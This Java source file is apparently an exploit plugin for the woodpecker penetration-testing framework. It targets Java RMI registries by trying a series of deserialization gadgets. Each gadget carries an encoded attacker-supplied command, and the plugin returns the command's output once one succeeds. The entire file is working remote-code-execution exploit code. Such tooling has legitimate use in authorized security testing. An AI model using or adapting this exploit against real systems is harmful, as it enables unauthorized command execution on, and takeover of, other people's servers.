package me.gv7.woodpecker.plugin.exploit;

import me.gv7.woodpecker.plugin.IArgs;
import me.gv7.woodpecker.plugin.IExploitCommand;
import me.gv7.woodpecker.plugin.JavaRMIVulPlugin;
import me.gv7.woodpecker.plugin.utils.CommonUtil;
import me.gv7.woodpecker.plugin.utils.RMIRegistryExploit;
import sun.misc.BASE64Encoder;
import javax.swing.*;
import java.util.Map;

public class RmiDeserialExecExploit implements IExploitCommand {
    @Override
    public Map<String, IArgs> createExecCustomArgs() {
        return null;
    }

    @Override
    public void doExec(String targetURL, String command, Map<String, String> customArgs, JTextArea taResult) {
        Map<String,Object> k = CommonUtil.parseURL(targetURL);
        String host = (String)k.get("host");
        int port = Integer.valueOf((String)k.get("port"));

        for(String gadget: JavaRMIVulPlugin.gadgets){
            try {
                taResult.append(String.format("[-] try gadget:%s\n",gadget));
                String bcelStr = CommonUtil.getEchoExeCode(command);
                bcelStr = new BASE64Encoder().encode(bcelStr.getBytes());
                String result = null;
                try {
                    Object objPayload = CommonUtil.generator(gadget, String.format("codebase64:%s", bcelStr));
                    if (objPayload == null) {
                        continue;
                    }
                    result = RMIRegistryExploit.sendPayload(host, port, objPayload);
                } catch (Throwable e) {
                    e.printStackTrace();
                }
                if (result != null) {
                    taResult.append(String.format("[+] Gadget:%s\n[+] Exec %s result:\n%s\n", gadget, command, result));
                    break;
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
}
